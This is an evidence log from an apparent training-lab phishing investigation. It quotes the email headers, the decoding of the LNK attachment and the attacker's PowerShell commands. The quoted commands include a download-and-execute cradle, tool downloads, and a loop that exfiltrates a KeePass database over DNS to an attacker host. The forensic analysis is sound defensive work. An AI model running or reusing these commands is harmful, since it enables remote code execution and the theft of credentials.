# Boogeyman 1 — Evidence Log

This file contains selected supporting evidence from the Boogeyman 1 investigation. The goal of this file is to preserve important evidence excerpts without making the project difficult to read.

Long raw artifacts such as the full `dump.eml`, full Base64 attachment content, and full `powershell.json` should be preserved separately in the investigation workspace. This file only includes relevant excerpts that support the investigation findings.

---

## 1. Evidence Inventory

| Evidence File | Description |
|---|---|
| `dump.eml` | Original phishing email file |
| `payload.txt` | Base64 attachment content copied from the email body for reconstruction |
| `Invoice.zip` | Reconstructed password-protected ZIP attachment |
| `Invoice_20230103.lnk` | Shortcut file extracted from the ZIP archive |
| `lnkparse output` | Output from analyzing the shortcut file |
| `powershell.json` | Endpoint PowerShell log source containing PowerShell Event ID 4104 records |
| `screenshots/` | Folder containing supporting investigation screenshots |

---

# Task 2 — Email and Attachment Evidence

## 2. Email Header Evidence

### 2.1 Sender, Recipient, Date, and Subject

```text
From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>
Return-Path: agriffin@bpakcaging.xyz
````

### Evidence Value

This evidence identifies:

* The phishing sender.
* The targeted victim.
* The email subject.
* The initial timestamp associated with the phishing email.

***

## 3. Mail Flow and Sender Infrastructure Evidence

### 3.1 Received Headers and Sender IP

```text
Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz
 designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com;
 client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=C

Received: from pa80.mxout.mta1.net (15.235.99.80) by
 BN8NAM04FT033.mail.protection.outlook.com with Microsoft SMTP Server;
 Fri, 13 Jan 2023 09:25:31 +0000

X-Sender-IP: 15.235.99.80
```

### 3.2 Microsoft Exchange Arrival Time

```text
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Jan 2023 09:25:31.6882 (UTC)
```

### 3.3 Email Delivery Timestamp

```text
Received: from KL1PR06MB6210.apcprd06.prod.outlook.com
 by TY2PR06MB2911.apcprd06.prod.outlook.com with HTTPS;
 Fri, 13 Jan 2023 09:25:35 +0000
```

### Evidence Value

This evidence supports the email timeline and identifies mail-flow infrastructure used during delivery.

***

## 4. DKIM and Mail Relay Evidence

### 4.1 Sender Domain DKIM Signature

```text
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api;
```

### 4.2 Elastic Email DKIM Signature

```text
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
```

### 4.3 List-Unsubscribe Header Reference

```text
List-Unsubscribe:
unsubscribe+HPk2p-JE_jYbkWIRB-SmuA2@bounces.elasticemail.net
```

### Evidence Value

This evidence shows that Elastic Email-related infrastructure appeared in email headers. This does not prove Elastic Email itself was malicious, but it supports the finding that legitimate third-party email delivery infrastructure may have been used or abused.

***

## 5. Tracking Domain Evidence

### 5.1 Message ID Tracking Domain

```text
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
```

### 5.2 Email Body Tracking Links

```text
http://tracking.bpakcaging.xyz/tracking/click
http://tracking.bpakcaging.xyz/tracking/unsubscribe
http://tracking.bpakcaging.xyz/tracking/open
```

### Evidence Value

This evidence identifies `tracking.bpakcaging.xyz` as email tracking infrastructure related to the phishing message.

***

## 6. Email Body Evidence

### 6.1 Invoice/Payment Lure

```text
Hi Julianne,

I hope you are well.

I just wanted to drop you a quick note to remind you in respect of document #39586972 is due for payment on January 20, 2023.

I would be grateful if you could confirm everything is on track for payment.

For additional information, kindly see the attached document.
```

### 6.2 ZIP Password in Email Body

```text
You may use this code to view the encrypted file: Invoice2023!
```

### 6.3 Signature Block

```text
Best regards,
Arthur Griffin
Collections Officer
B Packaging Inc.

E: agriffin@bpackaging.xyz
```

### Evidence Value

This evidence supports the finding that the email used an invoice/payment-themed lure and provided the password required to open the encrypted ZIP attachment.

***

## 7. Attachment Evidence

### 7.1 Attachment Metadata

```text
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64
```

### 7.2 Base64 Attachment Content

```text
UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmv...
```

### Evidence Value

This evidence confirms that the email contained a Base64-encoded ZIP attachment named `Invoice.zip`.

The Base64 content is truncated in this file for readability. The full Base64 content should be preserved in the original `dump.eml` or copied reconstruction file `payload.txt`.

***

## 8. Attachment Reconstruction Evidence

### 8.1 Base64 Decoding Command

```bash
cat payload.txt | base64 -d > Invoice.zip
```

### 8.2 ZIP Extraction Command

```bash
unzip Invoice.zip
```

### 8.3 Extracted File

```text
Invoice_20230103.lnk
```

### Evidence Value

This evidence supports the reconstruction and extraction process. The ZIP archive produced a Windows shortcut file instead of a normal invoice document.

***

## 9. LNK Analysis Evidence

### 9.1 lnkparse Command

```bash
lnkparse Invoice_20230103.lnk
```

### 9.2 Shortcut Target Path

```text
Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

### 9.3 Shortcut Command-Line Arguments

```text
Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

### 9.4 Shortcut Icon Location

```text
Icon location: C:\Users\Administrator\Desktop\excel.ico
```

### Evidence Value

This evidence shows that the `.lnk` file was configured to launch PowerShell with hidden and encoded command-line arguments. The Excel icon path suggests the shortcut may have been disguised as an invoice or spreadsheet-related file.

***

## 10. Decoded PowerShell Payload Evidence

### 10.1 Decoded Payload

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

### Evidence Value

This evidence shows that the shortcut attempted to download and execute remote content from:

```text
http://files.bpakcaging.xyz/update
```

This is consistent with a PowerShell download cradle.

***

# Task 3 — Endpoint PowerShell Evidence

## 11. Endpoint Evidence Overview

The following excerpts are pulled from the collected PowerShell logs in `powershell.json`. These records show attacker activity on the compromised workstation:

```text
QL-WKSTN-5693
```

PowerShell Event ID 4104 records were used to identify script block activity, attacker commands, tools, file access, and exfiltration behavior.

***

## 12. Attacker Domains Observed in PowerShell Logs

### 12.1 Domain Search Output

```text
cdn.bpakcaging.xyz
files.bpakcaging.xyz
```

### Evidence Value

This evidence expands the known attacker infrastructure from Task 2. The domain `files.bpakcaging.xyz` was already identified in the decoded LNK payload, while `cdn.bpakcaging.xyz` was later observed in endpoint PowerShell logs.

***

## 13. Seatbelt Download or Load Evidence

### 13.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:12:17.683688 UTC
Event ID: 4104
Record ID: 553
Command:
iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
```

### Evidence Value

This evidence shows that the attacker loaded or downloaded `Invoke-Seatbelt.ps1`, a PowerShell-based tool used for host enumeration.

***

## 14. Seatbelt Execution Evidence

### 14.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:18:05.437844 UTC
Event ID: 4104
Record ID: 630
Command:
Seatbelt.exe -group=user;pwd
```

### Evidence Value

This evidence shows that the attacker executed Seatbelt with a user-focused enumeration option.

***

## 15. KeePass Database Discovery Evidence

### 15.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:19:06.035992 UTC
Event ID: 4104
Record ID: 646
Command:
ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
```

### Evidence Value

This evidence shows that the attacker located a KeePass database file named:

```text
protected_data.kdbx
```

The file was located in the victim user's Documents directory.

***

## 16. Sticky Notes Folder Browsing Evidence

### 16.1 Sticky Notes Package Folder

```text
Timestamp: 2023-01-13 17:22:47.494476 UTC
Event ID: 4104
Record ID: 686
Command:
ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd
```

### 16.2 Sticky Notes LocalState Folder

```text
Timestamp: 2023-01-13 17:22:53.558146 UTC
Event ID: 4104
Record ID: 692
Command:
ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState;pwd
```

### Evidence Value

This evidence shows that the attacker browsed the Microsoft Sticky Notes application data path. This is relevant because Sticky Notes data is commonly stored in `plum.sqlite`.

***

## 17. sq3.exe Download Evidence

### 17.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:23:38.796891 UTC
Event ID: 4104
Record ID: 703
Command:
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
```

### Evidence Value

This evidence shows that the attacker downloaded `sq3.exe` from attacker-controlled infrastructure:

```text
http://files.bpakcaging.xyz/sq3.exe
```

***

## 18. Sticky Notes Database Query Evidence

### 18.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:25:38.759011 UTC
Event ID: 4104
Record ID: 724
Command:
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

### Evidence Value

This evidence shows that the attacker used `sq3.exe` to query the Microsoft Sticky Notes database:

```text
plum.sqlite
```

The SQL query attempted to retrieve records from the `NOTE` table.

***

## 19. KeePass Database Exfiltration Preparation Evidence

### 19.1 Initial File Read Attempt

```text
Timestamp: 2023-01-13 17:31:48.507719 UTC
Event ID: 4104
Record ID: 741
Command:
$file='protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

### 19.2 Full Path File Read Attempt

```text
Timestamp: 2023-01-13 17:32:15.105474 UTC
Event ID: 4104
Record ID: 762
Command:
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

### Evidence Value

This evidence shows that the attacker attempted to read the KeePass database file as bytes using PowerShell.

The targeted file was:

```text
C:\Users\j.westcott\Documents\protected_data.kdbx
```

The destination variable was set to:

```text
167.71.211.113
```

***

## 20. Hex Encoding Evidence

### 20.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:32:23.702462 UTC
Event ID: 4104
Record ID: 768
Command:
$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
```

### Evidence Value

This evidence shows that the attacker converted the file bytes into hexadecimal text before the exfiltration attempt.

***

## 21. DNS-Based Exfiltration Attempt Evidence

### 21.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:32:41.384043 UTC
Event ID: 4104
Record ID: 774
Command:
for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
```

### Evidence Value

This evidence shows that the attacker attempted to split the hex-encoded file content into chunks and transmit those chunks using DNS queries.

The DNS query pattern was:

```text
$chunk.exfil.bpakcaging.xyz
```

The destination IP address was:

```text
167.71.211.113
```

This behavior is consistent with DNS-based exfiltration.

***

# Screenshot Evidence References

## 22. Screenshot Inventory

| Screenshot                                                 | Purpose                                               |
| ---------------------------------------------------------- | ----------------------------------------------------- |
| `screenshots/01-email-sender-recipient.png`                | Shows sender and recipient headers                    |
| `screenshots/02-email-attachment-metadata.png`             | Shows ZIP attachment metadata                         |
| `screenshots/03-zip-password-email-body.png`               | Shows ZIP password in email body                      |
| `screenshots/04-zip-reconstruction-extraction.png`         | Shows attachment reconstruction and ZIP extraction    |
| `screenshots/05-lnkparse-powershell-command.png`           | Shows malicious LNK PowerShell command-line arguments |
| `screenshots/06-decoded-powershell-payload.png`            | Shows decoded PowerShell download cradle              |
| `screenshots/task3-q1-attacker-domains.png`                | Shows attacker domains found in PowerShell logs       |
| `screenshots/task3-q1-domain-log-context.png`              | Shows context for attacker domain references          |
| `screenshots/task3-q2-seatbelt-download-and-execution.png` | Shows Seatbelt download/load and execution activity   |
| `screenshots/task3-q3-sq3-sticky-notes-plum-sqlite.png`    | Shows `sq3.exe` and Sticky Notes database activity    |
| `screenshots/task3-q5-protected-data-kdbx-exfil-file.png`  | Shows KeePass database targeting                      |
| `screenshots/task3-q7-hex-encoding-focused.png`            | Shows hex encoding activity                           |
| `screenshots/task3-q8-nslookup-exfiltration.png`           | Shows `nslookup` exfiltration activity                |
| `screenshots/task3-exfil-nslookup-hex-dns.png`             | Shows DNS-based exfiltration evidence                 |


